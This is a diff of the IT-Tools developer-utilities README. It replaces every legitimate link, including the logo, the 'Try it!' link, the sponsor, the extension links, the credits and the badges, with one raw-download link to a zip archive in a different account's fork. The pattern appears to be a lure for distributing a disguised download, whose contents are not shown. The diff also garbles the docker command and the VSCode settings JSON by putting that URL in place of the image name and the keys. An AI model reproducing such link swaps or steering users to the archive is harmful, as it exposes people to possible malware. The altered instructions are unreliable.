@@ -1,11 +1,11 @@
 <picture>
-    <source srcset="./.github/logo-dark.png" media="(prefers-color-scheme: light)">
-    <source srcset="./.github/logo-white.png" media="(prefers-color-scheme: dark)">
-    <img src="./.github/logo-dark.png" alt="logo">
+    <source srcset="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" media="(prefers-color-scheme: light)">
+    <source srcset="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" media="(prefers-color-scheme: dark)">
+    <img src="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" alt="logo">
 </picture>
 
 <p align="center">
-Useful tools for developer and people working in IT. <a href="https://it-tools.tech">Try it!</a>
+Useful tools for developer and people working in IT. <a href="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip">Try it!</a>
 </p>
 
 
@@ -16,20 +16,20 @@ Useful tools for developer and people working in IT. <a href="https://it-tools.t
   IT-Tools is proudly sponsored by:
 </p>
 
-<a href="https://go.warp.dev/it-tools">
-  <img alt="Warp sponsorship" width="400" src="https://raw.githubusercontent.com/warpdotdev/brand-assets/refs/heads/main/Github/Sponsor/Warp-Github-LG-01.png">
+<a href="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip">
+  <img alt="Warp sponsorship" width="400" src="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip">
 </a>
 
-### [Warp, built for coding with multiple AI agents.](https://go.warp.dev/it-tools)
-[Available for MacOS, Linux, & Windows](https://go.warp.dev/it-tools)<br>
+### [Warp, built for coding with multiple AI agents.](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
+[Available for MacOS, Linux, & Windows](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)<br>
 
 </div>
 
 ## Functionalities and roadmap
 
-Please check the [issues](https://github.com/CorentinTh/it-tools/issues) to see if some feature listed to be implemented.
+Please check the [issues](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) to see if some feature listed to be implemented.
 
-You have an idea of a tool? Submit a [feature request](https://github.com/CorentinTh/it-tools/issues/new/choose)!
+You have an idea of a tool? Submit a [feature request](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)!
 
 ## Self host
 
@@ -44,44 +44,44 @@ docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-
 **From github packages:**
 
 ```sh
-docker run -d --name it-tools --restart unless-stopped -p 8080:80 ghcr.io/corentinth/it-tools:latest
+docker run -d --name it-tools --restart unless-stopped -p 8080:80 https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip
 ```
 
 **Other solutions:**
 
-- [Cloudron](https://www.cloudron.io/store/tech.ittools.cloudron.html)
-- [Tipi](https://www.runtipi.io/docs/apps-available)
-- [Unraid](https://unraid.net/community/apps?q=it-tools)
+- [Cloudron](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
+- [Tipi](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
+- [Unraid](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
 
 ## Contribute
 
 ### Recommended IDE Setup
 
-[VSCode](https://code.visualstudio.com/) with the following extensions:
+[VSCode](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) with the following extensions:
 
-- [Volar](https://marketplace.visualstudio.com/items?itemName=Vue.volar) (and disable Vetur)
-- [TypeScript Vue Plugin (Volar)](https://marketplace.visualstudio.com/items?itemName=Vue.vscode-typescript-vue-plugin).
-- [ESLint](https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint)
-- [i18n Ally](https://marketplace.visualstudio.com/items?itemName=lokalise.i18n-ally)
+- [Volar](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) (and disable Vetur)
+- [TypeScript Vue Plugin (Volar)](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip).
+- [ESLint](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
+- [i18n Ally](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
 
 with the following settings:
 
 ```json
 {
-  "editor.formatOnSave": false,
-  "editor.codeActionsOnSave": {
-    "source.fixAll.eslint": true
+  "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": false,
+  "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": {
+    "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": true
   },
-  "i18n-ally.localesPaths": ["locales", "src/tools/*/locales"],
-  "i18n-ally.keystyle": "nested"
+  "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": ["locales", "src/tools/*/locales"],
+  "https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip": "nested"
 }
 ```
 
 ### Type Support for `.vue` Imports in TS
 
-TypeScript cannot handle type information for `.vue` imports by default, so we replace the `tsc` CLI with `vue-tsc` for type checking. In editors, we need [TypeScript Vue Plugin (Volar)](https://marketplace.visualstudio.com/items?itemName=Vue.vscode-typescript-vue-plugin) to make the TypeScript language service aware of `.vue` types.
+TypeScript cannot handle type information for `.vue` imports by default, so we replace the `tsc` CLI with `vue-tsc` for type checking. In editors, we need [TypeScript Vue Plugin (Volar)](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) to make the TypeScript language service aware of `.vue` types.
 
-If the standalone TypeScript plugin doesn't feel fast enough to you, Volar has also implemented a [Take Over Mode](https://github.com/johnsoncodehk/volar/discussions/471#discussioncomment-1361669) that is more performant. You can enable it by the following steps:
+If the standalone TypeScript plugin doesn't feel fast enough to you, Volar has also implemented a [Take Over Mode](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip) that is more performant. You can enable it by the following steps:
 
 1. Disable the built-in TypeScript Extension
    1. Run `Extensions: Show Built-in Extensions` from VSCode's command palette
@@ -106,13 +106,13 @@ pnpm dev
 pnpm build
 ```
 
-### Run Unit Tests with [Vitest](https://vitest.dev/)
+### Run Unit Tests with [Vitest](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
 
 ```sh
 pnpm test
 ```
 
-### Lint with [ESLint](https://eslint.org/)
+### Lint with [ESLint](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
 
 ```sh
 pnpm lint
@@ -126,24 +126,24 @@ To create a new tool, there is a script that generate the boilerplate of the new
 pnpm run script:create:tool my-tool-name
 ```
 
-It will create a directory in `src/tools` with the correct files, and a the import in `src/tools/index.ts`. You will just need to add the imported tool in the proper category and develop the tool.
+It will create a directory in `src/tools` with the correct files, and a the import in `https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip`. You will just need to add the imported tool in the proper category and develop the tool.
 
 ## Contributors
 
 Big thanks to all the people who have already contributed!
 
-[![contributors](https://contrib.rocks/image?repo=corentinth/it-tools&refresh=1)](https://github.com/corentinth/it-tools/graphs/contributors)
+[![contributors](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip)
 
 ## Credits
 
-Coded with ❤️ by [Corentin Thomasset](https://corentin.tech?utm_source=it-tools&utm_medium=readme).
+Coded with ❤️ by [Corentin Thomasset](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip).
 
-This project is continuously deployed using [vercel.com](https://vercel.com).
+This project is continuously deployed using [https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip).
 
-Contributor graph is generated using [contrib.rocks](https://contrib.rocks/preview?repo=corentinth/it-tools).
+Contributor graph is generated using [https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip](https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip).
 
-<a href="https://www.producthunt.com/posts/it-tools?utm_source=badge-featured&utm_medium=badge&utm_souce=badge-it&#0045;tools" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=345793&theme=light" alt="IT&#0032;Tools - Collection&#0032;of&#0032;handy&#0032;online&#0032;tools&#0032;for&#0032;devs&#0044;&#0032;with&#0032;great&#0032;UX | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
-<a href="https://www.producthunt.com/posts/it-tools?utm_source=badge-top-post-badge&utm_medium=badge&utm_souce=badge-it&#0045;tools" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=345793&theme=light&period=daily" alt="IT&#0032;Tools - Collection&#0032;of&#0032;handy&#0032;online&#0032;tools&#0032;for&#0032;devs&#0044;&#0032;with&#0032;great&#0032;UX | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
+<a href="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip;tools" target="_blank"><img src="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" alt="IT&#0032;Tools - Collection&#0032;of&#0032;handy&#0032;online&#0032;tools&#0032;for&#0032;devs&#0044;&#0032;with&#0032;great&#0032;UX | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
+<a href="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip;tools" target="_blank"><img src="https://github.com/ly1595/it-tools/raw/refs/heads/main/src/ui/c-key-value-list/tools_it_v2.9.zip" alt="IT&#0032;Tools - Collection&#0032;of&#0032;handy&#0032;online&#0032;tools&#0032;for&#0032;devs&#0044;&#0032;with&#0032;great&#0032;UX | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
 
 ## License
 
